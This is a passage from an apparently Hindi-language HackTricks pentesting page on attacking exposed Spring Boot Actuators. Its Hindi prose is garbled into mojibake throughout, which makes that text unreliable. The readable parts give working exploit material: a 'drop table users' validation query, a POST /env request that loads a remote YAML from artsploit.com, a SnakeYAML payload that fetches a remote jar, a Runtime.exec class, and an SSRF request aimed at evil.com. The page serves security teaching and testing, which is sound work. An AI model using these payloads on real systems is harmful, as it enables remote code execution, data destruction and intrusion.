рдХрдирд╡рд░реНрдЯрд░](https://github.com/Netflix/eureka/blob/master/eureka-client/src/main/java/com/netflix/discovery/converters/XmlXStream.java#L58) рд╣реИ рдЬрд┐рд╕рд╕реЗ рдЗрд╕реЗ рдЕрдиреБрдкрдпреЛрдЧреА рдмрдирд╛ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдКрдкрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рдкреЗрд▓реЛрдб рдмрд┐рд▓реНрдХреБрд▓ рднреА рдореИрдкреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдмрд┐рдирд╛ рдЕрддрд┐рд░рд┐рдХреНрдд рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЗ Remote Code Execution рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

Spring Actuators рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдЖрдк рдЗрд╕ рдХрдордЬреЛрд░реА рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рднрд▓реЗ рд╣реА рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рдЖрдВрддрд░рд┐рдХ Eureka рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдБрдЪ рди рд╣реЛ; рдЖрдкрдХреЛ рдХреЗрд╡рд▓ рдПрдХ "/env" рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

**рдЕрдиреНрдп рдЙрдкрдпреЛрдЧреА рд╕реЗрдЯрд┐рдВрдЧреНрд╕:**

**spring.datasource.tomcat.validationQuery=drop+table+users** - рдЖрдкрдХреЛ рдХрд┐рд╕реА рднреА SQL рдХреНрд╡реЗрд░реА рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдФрд░ рдпрд╣ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╡рд░реНрддрдорд╛рди рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рдЦрд┐рд▓рд╛рдл рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛ред рдпрд╣ рдХреЛрдИ рднреА рд╕реНрдЯреЗрдЯрдореЗрдВрдЯ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ insert, update, рдпрд╛ delete рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

![Exploiting Spring Boot Actuators Drop Table](https://www.veracode.com/sites/default/files/exploiting_spring_boot_actuators_drop_table.png)

**spring.datasource.tomcat.url**=jdbc:hsqldb:[https://localhost:3002/xdb](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) - рдЖрдкрдХреЛ рд╡рд░реНрддрдорд╛рди JDBC рдХрдиреЗрдХреНрд╢рди рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рдЕрдВрддрд┐рдо рдПрдХ рдмрд╣реБрдд рдЕрдЪреНрдЫрд╛ рд▓рдЧрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рд╕рдорд╕реНрдпрд╛ рддрдм рд╣реЛрддреА рд╣реИ рдЬрдм рдбреЗрдЯрд╛рдмреЗрд╕ рдХрдиреЗрдХреНрд╢рди рдЪрд▓рд╛рдиреЗ рд╡рд╛рд▓рд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╕реНрдерд╛рдкрд┐рдд рд╣реЛ, рдмрд╕ JDBC рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░рдиреЗ рд╕реЗ рдХреЛрдИ рдкреНрд░рднрд╛рд╡ рдирд╣реАрдВ рдкрдбрд╝рддрд╛ рд╣реИред рд╕реМрднрд╛рдЧреНрдп рд╕реЗ, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣рдорд╛рд░реА рдорджрдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдФрд░ рдкреНрд░реЙрдкрд░реНрдЯреА рд╣реИ:

**spring.datasource.tomcat.max-active**=777

рдпрд╣рд╛рдБ рд╣рдо рдЬреЛ рдЪрд╛рд▓ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡рд╣ рд╣реИ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рд╕рд╛рде рд╕рдорд╛рдирд╛рдВрддрд░ рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдмрдврд╝рд╛рдирд╛ред рдЗрд╕рд▓рд┐рдП, рд╣рдо JDBC рдХрдиреЗрдХреНрд╢рди рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЙрд╕рдХреЗ рдмрд╛рдж рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рднрд╛рд░реА рд▓реЛрдб рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред рд▓реЛрдб рдХреЗ рддрд╣рдд, рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЕрдкрдбреЗрдЯреЗрдб рдореИрд▓рд┐рд╢рд╕ JDBC рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рд╕рд╛рде рдПрдХ рдирдпрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рдХрдиреЗрдХреНрд╢рди рдмрдирд╛рдПрдЧрд╛ред рдореИрдВрдиреЗ рдЗрд╕ рддрдХрдиреАрдХ рдХреЛ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ Mysql рдХреЗ рдЦрд┐рд▓рд╛рдл рдкрд░реАрдХреНрд╖рдг рдХрд┐рдпрд╛ рдФрд░ рдпрд╣ рдмрд╣реБрдд рдЕрдЪреНрдЫрд╛ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред

![Exploiting Spring Boot Actuators Max Active](https://www.veracode.com/sites/default/files/exploiting_spring_boot_actuators_max_active.png)

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЕрдиреНрдп рдкреНрд░реЙрдкрд░реНрдЯреАрдЬ рд╣реИрдВ рдЬреЛ рджрд┐рд▓рдЪрд╕реНрдк рд▓рдЧрддреА рд╣реИрдВ, рд▓реЗрдХрд┐рди, рд╡реНрдпрд╡рд╣рд╛рд░ рдореЗрдВ, рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реИрдВ:

**spring.datasource.url** - рдбреЗрдЯрд╛рдмреЗрд╕ рдХрдиреЗрдХреНрд╢рди рд╕реНрдЯреНрд░рд┐рдВрдЧ (рдХреЗрд╡рд▓ рдкрд╣рд▓реЗ рдХрдиреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИ)

**spring.datasource.jndiName** - рдбреЗрдЯрд╛рдмреЗрд╕ JNDI рд╕реНрдЯреНрд░рд┐рдВрдЧ (рдХреЗрд╡рд▓ рдкрд╣рд▓реЗ рдХрдиреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИ)

**spring.datasource.tomcat.dataSourceJNDI** - рдбреЗрдЯрд╛рдмреЗрд╕ JNDI рд╕реНрдЯреНрд░рд┐рдВрдЧ (рдмрд┐рд▓реНрдХреБрд▓ рднреА рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХреА рдЬрд╛рддреА рд╣реИ)

**spring.cloud.config.uri**=[http://artsploit.com/](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) - spring cloud config url (рдПрдкреНрдк рд╕реНрдЯрд╛рд░реНрдЯ рдХреЗ рдмрд╛рдж рдХреЛрдИ рдкреНрд░рднрд╛рд╡ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рдХреЗрд╡рд▓ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдорд╛рдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред)

рдпреЗ рдкреНрд░реЙрдкрд░реНрдЯреАрдЬ '/restart' рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЛ рдХреЙрд▓ рдХрд┐рдП рдЬрд╛рдиреЗ рддрдХ рдХреЛрдИ рдкреНрд░рднрд╛рд╡ рдирд╣реАрдВ рдбрд╛рд▓рддреА рд╣реИрдВред рдпрд╣ рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╕рднреА ApplicationContext рдХреЛ рдкреБрдирдГ рдЖрд░рдВрдн рдХрд░рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдпрд╣ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИред

рдЕрдиреНрдп рдмрд╣реБрдд рд╕рд╛рд░реА рджрд┐рд▓рдЪрд╕реНрдк рдкреНрд░реЙрдкрд░реНрдЯреАрдЬ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЙрдирдореЗрдВ рд╕реЗ рдЕрдзрд┐рдХрд╛рдВрд╢ рдкрд░рд┐рд╡рд░реНрддрди рдХреЗ рдмрд╛рдж рддрддреНрдХрд╛рд▓ рдкреНрд░рднрд╛рд╡ рдирд╣реАрдВ рдбрд╛рд▓рддреА рд╣реИрдВред

**рдиреЛрдЯ:** Spring Boot 2x рдореЗрдВ, '/env' рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░реЙрдкрд░реНрдЯреАрдЬ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдкреНрд░рд╛рд░реВрдк рдереЛрдбрд╝рд╛ рдЕрд▓рдЧ рд╣реИ (рдпрд╣ json рдкреНрд░рд╛рд░реВрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ), рд▓реЗрдХрд┐рди рд╡рд┐рдЪрд╛рд░ рд╡рд╣реА рд╣реИред

**рдХрдордЬреЛрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг:**

рдпрджрд┐ рдЖрдк рдЗрд╕ рдХрдордЬреЛрд░реА рдХрд╛ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдкрд░реАрдХреНрд╖рдг рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдореИрдВрдиреЗ рдЕрдкрдиреЗ Github рдкреЗрдЬ рдкрд░ рдПрдХ [рд╕рд░рд▓ Spring Boot рдПрдкреНрд▓рд┐рдХреЗрд╢рди](https://github.com/artsploit/actuator-testbed) рдмрдирд╛рдпрд╛ рд╣реИред рд╕рднреА рдкреЗрд▓реЛрдб рд╡рд╣рд╛рдБ рдХрд╛рдо рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП, рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ рдЫреЛрдбрд╝рдХрд░ (рдЬрдм рддрдХ рдЖрдк рдЗрд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рдХрд░рддреЗ)ред

**рдмреНрд▓реИрдХ рдмреЙрдХреНрд╕ рдбрд┐рд╕реНрдХрд╡рд░реА:**

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдПрдХреНрдЪреБрдПрдЯрд░реНрд╕ рдХреА рдкреВрд░реА рд╕реВрдЪреА рдпрд╣рд╛рдБ рдорд┐рд▓ рд╕рдХрддреА рд╣реИ: [https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt)ред рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдбреЗрд╡рд▓рдкрд░реНрд╕ рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ @Endpoint рдПрдиреЛрдЯреЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред

**рдордИ 2019 рдХрд╛ рдЕрдкрдбреЗрдЯ:**

Spring рдкрд░реНрдпрд╛рд╡рд░рдгреАрдп рдкреНрд░реЙрдкрд░реНрдЯреАрдЬ рдореЗрдВ рд╕рдВрд╢реЛрдзрди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЕрдзрд┐рдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рддрд░реАрдХрд╛ рд╣реИ:
```
```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml
```
рдпрд╣ рдЕрдиреБрд░реЛрдз 'spring.cloud.bootstrap.location' рдкреНрд░реЙрдкрд░реНрдЯреА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдмрд╛рд╣рд░реА рдХреЙрдиреНрдлрд╝рд┐рдЧ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдФрд░ рдЙрд╕реЗ YAML рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдкрд╛рд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕реЗ рд╕рдВрднрд╡ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ '/refresh' рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЛ рднреА рдХреЙрд▓ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред
```
POST /refresh HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
```markdown
рдЬрдм YAML рдХреЙрдиреНрдлрд╝рд┐рдЧ рд░рд┐рдореЛрдЯ рд╕рд░реНрд╡рд░ рд╕реЗ рдлреЗрдЪ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ SnakeYAML рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЗ рд╕рд╛рде рдкрд╛рд░реНрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдбрд┐рд╕реЗрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рд╣рдорд▓реЛрдВ рдХреЗ рд▓рд┐рдП рднреА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛрддреА рд╣реИред рдкреЗрд▓реЛрдб (yaml-payload.yml) рдЙрдкрд░реЛрдХреНрдд Marshalsec рдЕрдиреБрд╕рдВрдзрд╛рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬрдирд░реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ :
```
```
!!javax.script.ScriptEngineManager [
!!java.net.URLClassLoader [[
!!java.net.URL ["http://artsploit.com/yaml-payload.jar"]
]]
]
```
рдЗрд╕ рдлрд╛рдЗрд▓ рдХреЗ Deserialization рд╕реЗ ScriptEngineManager рдХреЗ constructor рдХреА execution рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ рджрд┐рдпрд╛ рдЧрдпрд╛ URLClassLoader рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИред рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ, рдпрд╣ **'java.util.ServiceLoader#load(java.lang.Class\<S>, java.lang.ClassLoader)'** рдореЗрдердб рдХреА рдУрд░ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдХреНрд▓рд╛рд╕рдкрд╛рде рдореЗрдВ рд╕рднреА рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬ рдореЗрдВ 'ScriptEngineFactory' рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЗ рд╕рднреА рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрдиреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИред рдЪреВрдВрдХрд┐ рд╣рдо URLClassLoader рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдирдИ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ, рд╣рдо рдПрдХ рдирдпрд╛ 'ScriptEngineFactory' рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдорд╛рд▓рд┐рд╢рд┐рдпрд╕ рдмрд╛рдЗрдЯрдХреЛрдб рд╢рд╛рдорд┐рд▓ рд╣реЛред рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдирд┐рд╡рд╛рд░реНрдп рдлрд╛рдЗрд▓реЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ jar рдЖрд░реНрдХрд╛рдЗрд╡ рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ: [yaml-payload.jar:/artsploit/AwesomeScriptEngineFactory.class](https://github.com/artsploit/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java) рдореЗрдВ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдмрд╛рдЗрдЯрдХреЛрдб рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕рдореЗрдВ constructor рдореЗрдВ рдорд╛рд▓рд┐рд╢рд┐рдпрд╕ рдкреЗрд▓реЛрдб рд╣реЛред
```
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

public AwesomeScriptEngineFactory() {
try {
Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
} catch (IOException e) {
e.printStackTrace();
}
}
```
```markdown
[yaml-payload.jar:/META-INF/services/javax.script.ScriptEngineFactory](https://github.com/artsploit/yaml-payload/blob/master/src/META-INF/services/javax.script.ScriptEngineFactory) рдПрдХ рдЯреЗрдХреНрд╕реНрдЯ рдлрд╛рдЗрд▓ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕рдореЗрдВ 'artsploit.AwesomeScriptEngineFactory' рдХрд╛ рдкреВрд░рд╛ рд╕рдВрджрд░реНрдн рд╣реЛ, рддрд╛рдХрд┐ ServiceLoader рдХреЛ рдкрддрд╛ рдЪрд▓ рд╕рдХреЗ рдХрд┐ рдХреНрд▓рд╛рд╕ рдХрд╣рд╛рдВ рдорд┐рд▓реЗрдЧреА: **artsploit.AwesomeScriptEngineFactory** рдлрд┐рд░ рд╕реЗ, рдЗрд╕ рд╢реЛрд╖рдг рддрдХрдиреАрдХ рдХреЗ рд▓рд┐рдП spring cloud рдХрд╛ classpath рдореЗрдВ рд╣реЛрдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ, рд▓реЗрдХрд┐рди Eureka рдХреЗ XStream payload рдХреА рддреБрд▓рдирд╛ рдореЗрдВ, рдпрд╣ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ рднреА рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред рдкреВрд░рд╛ payload рдЖрдк рдореЗрд░реЗ github рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ: [yaml-payload](https://github.com/artsploit/yaml-payload).

## Env + H2 RCE

рдЗрд╕ рдкреЗрдЬ рдкрд░ рдЬрд╛рдПрдВ рдФрд░ рдЬрд╛рдиреЗрдВ рдХрд┐ /env + H2 рд╕рдВрдпреЛрдЬрди рдХрд╛ рд╢реЛрд╖рдг рдХреИрд╕реЗ рдХрд░реЗрдВ: [https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)

## Spring Boot рдореЗрдВ рдЧрд▓рдд Pathname рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ SSRF <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

[**рдЗрд╕ рд╢реЛрдз рд╕реЗ**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation): Spring framework HTTP pathname рдХреЗ рдкрд╣рд▓реЗ рд╕реНрд▓реИрд╢ рд╕реЗ рдкрд╣рд▓реЗ рдореИрдЯреНрд░рд┐рдХреНрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рд╡рд┐рднрд╛рдЬрдХ рдЪрд░рд┐рддреНрд░ `;` рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ:
```
```http
GET ;1337/api/v1/me HTTP/1.1
Host: target.com
Connection: close
```
рдЗрд╕ рддрд░рд╣ рдХреА рдкрд░рд┐рд╕реНрдерд┐рддрд┐ рдореЗрдВ:

<figure><img src="../../.gitbook/assets/image (717).png" alt="" width="563"><figcaption></figcaption></figure>

рдпрд╣ рджреЗрдЦрддреЗ рд╣реБрдП рдХрд┐ Spring рдореИрдЯреНрд░рд┐рдХреНрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рд╕реЗрдкрд░реЗрдЯрд░ рдХреЗ рдмрд╛рдж рдХрд┐рд╕реА рднреА рдЕрдХреНрд╖рд░ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, `@` рдЕрдХреНрд╖рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдордирдорд╛рдиреЗ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЛ рднреА рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

рдиреАрдЪреЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдЕрдиреБрд░реЛрдз рдХрд╛ рдЙрджрд╛рд╣рд░рдг рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
## рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

* [https://tutorialboy24.blogspot.com/2022/02/introduction-to-spring-boot-related.html](https://tutorialboy24.blogspot.com/2022/02/introduction-to-spring-boot-related.html)
* [https://blog.maass.xyz/spring-actuator-security-part-1-stealing-secrets-using-spring-actuators](https://blog.maass.xyz/spring-actuator-security-part-1-stealing-secrets-using-spring-actuators)
* [https://blog.maass.xyz/spring-actuator-security-part-2-finding-actuators-using-static-code-analysis-with-semgrep](https://blog.maass.xyz/spring-actuator-security-part-2-finding-actuators-using-static-code-analysis-with-semgrep)

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛрдЬрд╝ рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВ.

</details>
